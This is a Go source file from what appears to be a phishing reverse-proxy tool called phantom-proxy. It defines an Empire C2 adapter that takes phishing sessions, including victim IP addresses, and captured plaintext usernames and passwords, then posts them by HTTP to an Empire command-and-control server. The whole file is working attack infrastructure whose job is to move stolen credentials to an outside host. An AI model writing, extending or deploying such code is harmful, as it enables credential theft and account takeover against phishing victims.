package c2

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"time"

	"github.com/phantom-proxy/phantom-proxy/internal/database"
)

// EmpireAdapter integrates with Empire C2 REST API
type EmpireAdapter struct {
	config     *EmpireConfig
	httpClient *http.Client
}

// EmpireConfig configuration
type EmpireConfig struct {
	Enabled    bool   `yaml:"enabled" mapstructure:"enabled"`
	ServerURL  string `yaml:"server_url" mapstructure:"server_url"`
	Username   string `yaml:"username" mapstructure:"username"`
	Password   string `yaml:"password" mapstructure:"password"`
	Token      string `yaml:"token" mapstructure:"token"`
}

// NewEmpireAdapter creates Empire adapter
func NewEmpireAdapter(cfg *EmpireConfig) *EmpireAdapter {
	return &EmpireAdapter{
		config: cfg,
		httpClient: &http.Client{
			Timeout: 30 * time.Second,
		},
	}
}

// Name returns adapter name
func (a *EmpireAdapter) Name() string { return "empire" }

// IsAvailable checks Empire API
func (a *EmpireAdapter) IsAvailable(ctx context.Context) bool {
	if !a.config.Enabled || a.config.ServerURL == "" {
		return false
	}
	req, _ := http.NewRequestWithContext(ctx, "GET", a.config.ServerURL+"/api/version", nil)
	a.setAuth(req)
	resp, err := a.httpClient.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	return resp.StatusCode == 200
}

func (a *EmpireAdapter) setAuth(req *http.Request) {
	if a.config.Token != "" {
		req.Header.Set("Authorization", "Bearer "+a.config.Token)
	}
}

// SendSession sends session to Empire
func (a *EmpireAdapter) SendSession(ctx context.Context, data *SessionData) error {
	if !a.config.Enabled {
		return nil
	}
	// Empire API: sessions, credentials
	body, _ := json.Marshal(map[string]interface{}{
		"session_id": data.SessionID,
		"victim_ip":  data.VictimIP,
		"phishlet":   data.PhishletID,
	})
	req, _ := http.NewRequestWithContext(ctx, "POST", a.config.ServerURL+"/api/v2/credentials", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	a.setAuth(req)
	resp, err := a.httpClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 400 {
		return fmt.Errorf("empire API error: %d", resp.StatusCode)
	}
	return nil
}

// SendCredentials sends credentials to Empire
func (a *EmpireAdapter) SendCredentials(ctx context.Context, creds *database.Credentials, metadata map[string]string) error {
	if !a.config.Enabled {
		return nil
	}
	body, _ := json.Marshal(map[string]interface{}{
		"username": creds.Username,
		"password": creds.Password,
		"type":     "plaintext",
		"origin":   "phantomproxy",
	})
	req, _ := http.NewRequestWithContext(ctx, "POST", a.config.ServerURL+"/api/credentials", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	a.setAuth(req)
	resp, err := a.httpClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

// HealthCheck verifies Empire connection
func (a *EmpireAdapter) HealthCheck(ctx context.Context) error {
	if !a.IsAvailable(ctx) {
		return fmt.Errorf("empire server not available")
	}
	return nil
}
